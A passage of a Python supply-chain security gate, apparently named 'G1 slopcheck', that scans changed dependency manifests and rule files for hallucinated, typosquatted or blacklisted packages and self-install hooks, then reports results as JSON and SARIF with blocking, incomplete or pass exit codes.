        TARGET = Path(target).expanduser().resolve()
        if not TARGET.is_dir():
            print(f"⚠️ G1 無法完成檢查：--target 不是目錄（{target}）→ incomplete。", file=sys.stderr)
            return 2
    manifests = list(_opt(args, "--manifest"))
    rule_files = list(_opt(args, "--rules-file"))
    base = (_opt(args, "--base") or [None])[-1]
    sarif_out = (_opt(args, "--sarif") or [None])[-1]
    gate_out = (_opt(args, "--gate") or [None])[-1]
    changed = []
    if "--staged" in args:
        changed += staged_files()
    for lst in _opt(args, "--changed-files"):
        try:
            changed += [l.strip() for l in Path(lst).read_text().splitlines() if l.strip()]
        except OSError as e:
            # 清單讀不到 = 不知道改了什麼；以前靜默當成「沒有變更」而 pass（第四次審視 S-8）
            print(f"⚠️ G1 無法完成檢查：--changed-files {lst} 讀不到（{e}）→ incomplete。", file=sys.stderr)
            if gate_out:
                write_gate(gate_out, [], [f"變更檔清單讀不到：{lst}"], started, base, "diff" if base else "full", sarif_out)
            return 2
    selected = manifests or rule_files or changed or "--staged" in args or _opt(args, "--changed-files")
    if target and not selected:
        changed = discover(TARGET)          # 只給 --target：全量掃描目標專案
    for f in changed:
        if MANIFEST_RE.search(f):
            manifests.append(f)
        elif is_rule_file(f) and not (f.startswith("config/slopsquat/") and not external_target()):
            rule_files.append(f)
    manifests = [resolve(m) for m in dict.fromkeys(manifests) if resolve(m).exists()]
    rule_files = [resolve(r) for r in dict.fromkeys(rule_files) if resolve(r).exists()]
    scope = "diff" if base else "full"
    notes = []
    if external_target():
        notes.append(f"目標專案 {TARGET.name}：blocking-policy exceptions 只核准給本 repo 路徑，未套用")

    if not manifests and not rule_files:
        out = {"gate": "G1", "findings": []}
        if external_target():
            out["target"] = str(TARGET)
        print(json.dumps(out, ensure_ascii=False, indent=2))
        if sarif_out:
            write_sarif(sarif_out, [])
        if gate_out:
            write_gate(gate_out, [], [], started, base, scope, sarif_out, notes)
        print("G1 slopcheck：無相依清單或規則檔變更，略過。", file=sys.stderr)
        return 0

    c = cfg()
    # 相似度只比對同生態系的熱門清單（npm 的 request 不該被比成 PyPI 的 requests）
    popular = {"npm": load_popular("popular-npm.txt"), "pypi": load_popular("popular-pypi.txt")}
    blacklist = load_list("blacklist.yaml")
    allowlist, ignored_allowlist = load_allowlist()
    if ignored_allowlist:
        notes.append("忽略的 allowlist 條目：" + "；".join(ignored_allowlist))
    exceptions, ignored_exceptions = load_exceptions() if not external_target() else ([], [])

    targets = [(m, added_packages(m, base), False) for m in manifests]
    targets += [(r, rule_file_mentions(r), True) for r in rule_files]

    findings, incomplete = [], []
    unparsed = [rel_path(m) for m in manifests if UNPARSED_RE.search(Path(m).name)]
    if unparsed:
        incomplete.append(f"鎖定檔尚無解析器，其中的套件未逐一檢查：{', '.join(unparsed)}")
    indirect = {}       # package-lock.json、requirements 鎖定檔 → 只以間接相依出現的 (名稱小寫, 版本)：不做名稱相似度
    for m in manifests:
        _, bad = parse_manifest([m])
        if bad:
            incomplete.append(f"{rel_path(m)}：{len(bad)} 筆無法解析或不是 registry 來源，未檢查"
                              f"（{', '.join(bad[:5])}{' …' if len(bad) > 5 else ''}）")
        if Path(m).name in ("package-lock.json", "npm-shrinkwrap.json"):
            entries, _ = npm_lock(m)
            indirect[m] = {(n.lower(), v) for n, v, d in entries if not d} - {(n.lower(), v) for n, v, d in entries if d}
        elif re.search(r'requirements.*\.txt$', Path(m).name):
            indirect[m] = requirements_indirect(m)

    # registry 查詢：同一個 (生態系, 名稱, 版本) 只查一次，並行查詢（鎖定檔動輒上千筆）
    # allowlist 內的套件也要查：allowlist 只放行特定檢查，安裝 hook 等其他檢查照做
    jobs = list(dict.fromkeys((e, n, v) for _, pk, _ in targets for e, n, v in pk))
    _policy()           # 先載入政策，避免執行緒競爭初始化
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        checked = dict(zip(jobs, ex.map(lambda j: (npm_check if j[0] == "npm" else pypi_check)(j[1], j[2], c), jobs)))

    for source, packages, from_rules in targets:
        source_rel = rel_path(source)
        for eco, name, ver in packages:
            found = []
            fuzzy = (name.lower(), ver) not in indirect.get(source, ())
            sim = similarity_check(name, eco, popular.get(eco, set()), blacklist, c, fuzzy)
            if sim:
                found.append(sim)
            fs, reason = checked[(eco, name, ver)]
            fs = [dict(f) for f in fs]              # 同一筆查詢結果可能出現在多個 manifest
            if from_rules:
                for f in fs:
                    if f["rule_id"] == "vibesec.g1.hallucinated-package":
                        f["rule_id"] = "vibesec.g1.rules-file-unknown-package"
                        f["policy_tier"] = _policy().cap(f["rule_id"], f["policy_tier"])   # 改名後依政策重算
            found.extend(fs)
            if reason:
                incomplete.append(reason)
            for f in found:
                f["manifest"] = source_rel
                findings.append(apply_exceptions(apply_allowlist(f, allowlist, ver), exceptions))

    for m in manifests:
        f = self_install_hooks(m)
        if f:
            f["manifest"] = rel_path(m)
            findings.append(apply_exceptions(f, exceptions))
    pypi_checked = sum(1 for e, _, _ in jobs if e == "pypi")

    incomplete = list(dict.fromkeys(incomplete))
    out = {"gate": "G1", "findings": findings}
    if external_target():
        out["target"] = str(TARGET)
        out["notes"] = notes
    if ignored_exceptions:
        out["ignored_exceptions"] = ignored_exceptions
    if ignored_allowlist:
        out["ignored_allowlist"] = ignored_allowlist
    if incomplete:
        out["status"] = "incomplete"
        out["status_reason"] = "；".join(incomplete)
    print(json.dumps(out, ensure_ascii=False, indent=2))
    if sarif_out:
        write_sarif(sarif_out, findings)
    if gate_out:
        write_gate(gate_out, findings, incomplete, started, base, scope, sarif_out, notes, pypi_checked=pypi_checked)

    blocking = [f for f in findings if f["policy_tier"] == "blocking"]
    if blocking:
        print(f"\n⛔ G1 阻擋：{len(blocking)} 筆 blocking 供應鏈發現。", file=sys.stderr)
        return 1
    if incomplete:
        print("\n⚠️ G1 無法完成檢查（網路/registry 失敗或鎖定檔未解析）→ incomplete，絕不視為通過。", file=sys.stderr)
        return 2
    print("\n✅ G1 快篩通過。", file=sys.stderr)
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv))
